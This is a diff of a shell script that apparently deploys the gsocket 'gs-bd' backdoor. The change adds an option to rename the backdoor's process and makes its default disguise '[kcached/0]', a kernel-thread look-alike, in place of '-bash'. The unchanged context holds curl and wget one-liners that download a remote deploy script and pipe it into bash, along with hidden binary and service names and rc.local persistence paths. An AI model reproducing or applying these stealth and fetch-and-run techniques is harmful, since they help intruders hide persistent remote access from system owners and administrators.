@@ -41,7 +41,11 @@
 # GS_URL_BASE=https://github.com/hackerschoice/binary/raw/main/gsocket/bin/
 #		- Specify URL of static binaries
 # GS_DSTDIR="/tmp/foobar/blah"
-#		- Specify customer installation directory
+#		- Specify custom installation directory
+# GS_HIDDEN_NAME="-bash"
+#       - Specify custom hidden name for process
+# TMPDIR=
+#       - Guess what...
 
 # Global Defines
 URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
@@ -52,7 +56,7 @@ DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
 # DL_CMD="$DL_CRL"
 BIN_HIDDEN_NAME_DEFAULT=gs-bd
-PROC_HIDDEN_NAME_DEFAULT=-bash
+PROC_HIDDEN_NAME_DEFAULT="[kcached/0]"
 CY="\033[1;33m" # yellow
 CG="\033[1;32m" # green
 CR="\033[1;31m" # red
@@ -258,7 +262,7 @@ init_vars()
 	BIN_HIDDEN_NAME="${BIN_HIDDEN_NAME_DEFAULT}"
 	
 	SEC_NAME="${BIN_HIDDEN_NAME_DEFAULT}.dat"
-	PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
+	PROC_HIDDEN_NAME="${GS_HIDDEN_NAME:-$PROC_HIDDEN_NAME_DEFAULT}"
 	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"
 
 	RCLOCAL_DIR="${GS_PREFIX}/etc"
